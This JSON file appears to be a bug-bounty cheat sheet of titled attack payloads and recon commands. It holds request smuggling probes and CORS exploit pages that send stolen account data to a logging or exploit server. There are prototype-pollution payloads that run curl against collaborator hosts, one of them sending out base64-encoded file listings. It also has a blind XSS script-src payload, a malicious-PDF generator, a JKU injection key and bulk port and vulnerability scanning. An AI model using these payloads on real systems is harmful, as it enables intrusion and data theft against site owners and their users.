[
    {
        "title": "Base64 Methodology",
        "subtitle": "Decode and analyze Base64 encoded data",
        "commands": [
            "cat all_urls.txt | gf base64 | tee base64_raw.txt",
            "cat base64_raw.txt | awk -F: '{print $3}' | tee base64.txt",
            "while read line; do echo \"$line\" | base64 -d; echo; done < base64.txt"
        ]
    },
    {
        "title": "REQUEST SMUGGLING DETECTING CL.TE",
        "subtitle": "- Timeout means success  <br> - Rejection means the backend is using TE",
        "commands": [
            "Content-Length: 6",
            "Transfer-Encoding: chunked",
            "",
            "3",
            "abc",
            "X",
            ""
        ]
    },
    {
        "title": "REQUEST SMUGGLING DETECTING TE.CL",
        "subtitle": "Timeout means success",
        "commands": [
            "Content-Length: 6",
            "Transfer-Encoding: chunked",
            "",
            "0",
            "",
            "X"
        ]
    },
    {
        "title": "1. CORS: BASIC ORIGIN REFLECTION",
        "subtitle": "POC for CORS vulnerability with basic origin reflection <br> -generate poc with https://guptashubham.com/resources/cors-poc-generator/",
        "commands": [
            "&lt;html&gt;",
            "&lt;body&gt;",
            "  &lt;script&gt;",
            "    var xhr = new XMLHttpRequest();",
            "    var url = \"https://0a4000640477ce6d822230e700300072.web-security-academy.net\";",
            "",
            "    xhr.onreadystatechange = function () {",
            "      if (xhr.readyState == XMLHttpRequest.DONE) {",
            "        fetch(\"/log?key=\" + xhr.responseText);",
            "      }",
            "    };",
            "",
            "    xhr.open('GET', url + \"/accountDetails\", true);",
            "    xhr.withCredentials = true;",
            "    xhr.send(null);",
            "  &lt;/script&gt;",
            "&lt;/body&gt;",
            "&lt;/html&gt;"
        ]
    },
    {
        "title": "CORS:trusted null origin",
        "subtitle": "insecure  CORS configuration where the website trusts the \"null\" origin js code",
        "commands": [
            "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"<script>",
            "    var req = new XMLHttpRequest();",
            "    req.onload = reqListener;",
            "    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);",
            "    req.withCredentials = true;",
            "    req.send();",
            "    function reqListener() {",
            "        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);",
            "    };",
            "</script>\"></iframe>"
        ]
    },
    {
        "title": "GREP SECRETS",
        "subtitle": "Grab secrets from jsfiles",
        "commands": [
            "grep -r -E \"aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret|smtp\""
        ]
    },
    {
        "title": "PROTOTYPE POLLUTION: JSON SPACES",
        "subtitle": "Tampers with json response spacing",
        "commands": [
            "\"__proto__\":{",
            "  \"json spaces\": 100",
            "}"
        ]
    },
    {
        "title": "PROTOTYPE POLLUTION: CHARSET OVERRIDE",
        "subtitle": "- Forces the server to render values in UTF-7 encoding if controllable. <br> - Tip: if there is a controllable value and it is reflecting, give it a value converted to utf7. <br> - After that, add the above payload to see if the charset obeyed and rendered the value in utf-7.",
        "commands": [
            "\"__proto__\":{",
            "  \"content-type\": \"application/json; charset=utf-7\"",
            "}"
        ]
    },
    {
        "title": "PROTOTYPE POLLUTION: OVERRIDING THE STATUS",
        "subtitle": "- Overrides error status returned by the server. <br>- Tip: First send improperly formatted JSON and note the error variable.<br> - Use that variable with __proto__ to override it, then trigger the error again and check if the overridden value exists.",
        "commands": [
            "\"__proto__\":{",
            "  \"status\": 555",
            "}"
        ]
    },
    {
        "title": "PROTOTYPE POLLUTION: USING CONSTRUCTOR",
        "subtitle": "Injects new properties into the object prototype using constructor.",
        "commands": [
            "\"constructor\":{",
            "  \"prototype\":{",
            "    \"new\":\"added\"",
            "  }",
            "}"
        ]
    },
    {
        "title": "PROTOTYPE POLLUTION: REMOTE CODE EXECUTION",
        "subtitle": "Abuses execArgv to execute system commands remotely.",
        "commands": [
            "\"__proto__\": {",
            "  \"execArgv\":[",
            "    \"--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')\"",
            "  ]",
            "}"
        ]
    },
    {
        "title": "PROTOTYPE POLLUTION: RCE USING VIM",
        "subtitle": "Sets shell to vim and abuses :! command to send request to collaborator.",
        "commands": [
            "\"__proto__\":{",
            "  \"shell\":\"vim\",",
            "  \"input\":\":!curl https://323s6lgfrgtj5ubwohwljxy0vr1ip8dx.oastify.com\\n\"",
            "}"
        ]
    },
    {
        "title": "PROTOTYPE POLLUTION: EXTRACTING DATA",
        "subtitle": "Exfiltrates data using vim shell and base64 encoded curl requests.",
        "commands": [
            "\"__proto__\":{",
            "  \"shell\":\"vim\",",
            "  \"input\":\":!ls | base64 |curl -d @- https://323s6lgfrgtj5ubwohwljxy0vr1ip8dx.oastify.com\\n\"",
            "}"
        ]
    },
    {
        "title": "GET SWAGGER APIS",
        "subtitle": "This will fetch all available swagger pages from the host file given",
        "commands": [
            "nuclei -list hosts_alive.txt -t /home/aceos/nuclei-templates/http/exposures/apis/swagger-api.yaml"
        ]
    },
    {
        "title": "SEMIGREP ANALYSIS",
        "subtitle": "It does static code analysis",
        "commands": [
            "cat js_urls.txt | xargs -n 1 -I {} wget -q {}",
            "semgrep --config=p/javascript ./"
        ]
    },
    {
        "title": "NON STANDARD PORTS",
        "subtitle": "This commands scans live hosts for non standard ports",
        "commands": [
            "httpx -l all_subdomains.txt -ports 80,443,8080,8443,8008,8081,8011,3306,5432,6379,27017,15672,10000,9090,5900 -threads 80 -o alive.txt"
        ]
    },
    {
        "title": "FASTER PORT SCANNING WITH NAABU",
        "subtitle": "This uses Naabu tool for scanning open ports",
        "commands": [
            "naabu -iL hosts_alive.txt -c 50 -nmap-cli \"nmap -sV -o naabuports.txt\""
        ]
    },
    {
        "title": "VirusTotal Domain Lookup",
        "subtitle": "Query VirusTotal API to retrieve domain reputation, subdomains, and related data \n export VT_KEY=\"YOUR_API_KEY\"",
        "commands": [
            "curl \"https://www.virustotal.com/vtapi/v2/domain/report?apikey=$VT_KEY&domain=snapchat.com\" | jq -r"
        ]
    },
    {
        "title": "Favicon Hashing Methodology",
        "subtitle": "Extract and hash favicon.ico files to identify technologies or applications",
        "commands": [
            "curl -s '<URL>/favicon.ico' | base64 | python3 -c 'import mmh3,sys;print(mmh3.hash(sys.stdin.buffer.read()))'"
        ]
    },
    {
        "title": "Shodan Favicon Hash Hunting",
        "subtitle": "Search Shodan using favicon hashes to identify similar technologies or applications",
        "commands": [
            "http.favicon.hash:-1533858881"
        ]
    },
    {
        "title": "CORS Payloads",
        "subtitle": "Test misconfigured CORS policies with trusted developer domains",
        "commands": [
            "https://github.io",
            "https://stackblitz.com",
            "https://codepen.io",
            "https://jsfiddle.net"
        ]
    },
    {
        "title": "MALICIUS PDFs",
        "subtitle": "Generates malicius pdfs<br> -test1.pdf : Network callback via file system <br> -test1bis.pdf : Network callback via HTTPS <br> -test2.pdf : Automatic form submission <br> -test3.pdf : External document loading <br> -test4.pdf : UNC path callback <br> -test5.pdf : DNS prefetching/HTTP request <br> -test6.pdf : External resource execution <br> -test7.pdf : Remote PDF loading <br> -test8.pdf : Form data submission <br> -test9.pdf : External data import <br>",
        "commands": [
            "python  ~/malicious-pdf/malicious-pdf.py  burp-collaborator-url"
        ]
    },
    {
        "title": "MISCONFIG MAPPER",
        "subtitle": "Searches for misconfigs in third party technology integration",
        "commands": [
            "misconfig-mapper -target \"yourcompanyname\" -service \"*\" -delay 1000"
        ]
    },
    {
        "title": "JIRA VULNERABILITY SCANNER",
        "subtitle": "Scans for vulnerabilities in jira app",
        "commands": [
            "docker run -v \"$(pwd)/Jira-Lens/output:/app/Jira-Lens/output\" jira-lens &lt;url&gt;"
        ]
    },
    {
        "title": "SCREENSHOT DOMAINS",
        "subtitle": "Takes screenshots of a list of live domains",
        "commands": [
            "cat hosts_alive.txt | aquatone -out ./output -http-timeout 60000"
        ]
    },
    {
        "title": "CLRF FUZZING",
        "subtitle": "Scans subdomains for slrf vulnerability",
        "commands": [
            "crlfuzz -list hosts_alive.txt -o crlfuzz.txt"
        ]
    },
    {
        "title": "HTTP REQUEST SMUGGLING SCANNER",
        "subtitle": "Scans hosts for HTTP request smuggling vulnerabilities",
        "commands": [
            "cat hosts_alive.txt | xargs -I{} zsh -c 'printf \"[*] %s\n\" \"$1\"; python3 /home/aceos/smuggler/smuggler.py -u \"$1\"' _ {} 2>&1 | tee -a smuggler.txt"
        ]
    },
    {
        "title": "BLIND XSS SCANNING",
        "subtitle": "Bxss tool is used to scan for blind xss <br>- For dorks use this page https://lostsec.xyz/coffin/dorking.html",
        "commands": [
            "cat all_urls.txt | uro | bxss -p '&lt;script src=https://xss.report/c/aceos&gt;&lt;/script&gt;' -H 'Referer' -H 'Origin' -H 'X-Forwarded-For' -H 'User-Agent'"
        ]
    },
    {
        "title": "CHECKS FOR URLS IN ROBOTS.TXT",
        "subtitle": "Checks while domains have robots.txt file which is accessible",
        "commands": [
            "python ~/aceos-tools/robots_checker.py -list hosts_alive.txt"
        ]
    },
    {
        "title": "BRUTEFORCE WITH MEGA",
        "subtitle": "A brutefoce tool from tomnomnom that bruteforces all subdomains at once in parallel",
        "commands": [
            "meg -v /home/aceos/meg_wordlist.txt hosts_alive.txt meg_output"
        ]
    },
    {
        "title": "JKU INJECTION",
        "subtitle": "add jku parameter and edit k parameter <br> - \"jku\":\"https://recon-theta.vercel.app/jwks.json\" <br> - \"kid\": \"893d8f0b-061f-42c2-a4aa-5056e12b8ae7\"",
        "commands": [
            "{",
            "    \"keys\": [",
            "        {",
            "            \"kty\": \"RSA\",",
            "            \"e\": \"AQAB\",",
            "            \"kid\": \"893d8f0b-061f-42c2-a4aa-5056e12b8ae7\",",
            "            \"n\": \"yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw\"",
            "        }",
            "    ]",
            "}"
        ]
    }
]